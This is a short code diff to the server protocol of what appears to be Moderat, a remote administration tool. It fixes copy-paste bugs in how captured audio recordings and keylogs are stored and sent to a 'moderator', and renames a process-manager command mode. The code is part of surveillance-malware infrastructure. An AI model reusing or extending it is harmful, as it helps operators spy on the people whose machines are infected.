@@ -366,13 +366,13 @@ class ModeratServerProtocol(Protocol):
                 for audio in audios_list:
                     if os.path.exists(audio[3]):
                         self.audio_dict[audio[1]] = {}
-                        self.keylogs_dict[audio[1]]['datetime'] = audio[1]
-                        self.keylogs_dict[audio[1]]['date'] = audio[2]
-                        self.keylogs_dict[audio[1]]['raw'] = open(audio[3], 'rb').read()
+                        self.audio_dict[audio[1]]['datetime'] = audio[1]
+                        self.audio_dict[audio[1]]['date'] = audio[2]
+                        self.audio_dict[audio[1]]['raw'] = open(audio[3], 'rb').read()
                         audios_names.append(audio[1])
                     else:
                         log.info('File Not Found Delete Entry (%s)' % audio[3])
-                        manageKeylogs.delete_keylog(audio[1])
+                        manageAudio.delete_audios(audio[1])
                 # Send Data Count
                 self.send_message_to_moderator(self, audios_names, len(audios_list))
             else:
@@ -381,9 +381,9 @@ class ModeratServerProtocol(Protocol):
         elif data['mode'] == 'downloadAudio':
             audio_name = data['payload']
             if self.audio_dict.has_key(audio_name):
-                self.send_message_to_moderator(self, self.audio_dict[audio_name], 'downloadKeylog')
+                self.send_message_to_moderator(self, self.audio_dict[audio_name], 'downloadAudio')
                 manageAudio.set_audio_viewed(self.audio_dict[audio_name]['datetime'])
-                del self.keylogs_dict[audio_name]
+                del self.audio_dict[audio_name]
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
 
@@ -441,7 +441,7 @@ class ModeratServerProtocol(Protocol):
             log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
         # Processes Manager
-        elif data['mode'] == 'proccessMode':
+        elif data['mode'] == 'processesMode':
             log.info('Send (%s) Message to %s from %s' % (data['mode'], data['to'], data['from']))
             self.send_message_to_client(clients[data['to']]['socket'], data['payload'], data['mode'], session_id=data['session_id'])
         # Remote Scripting
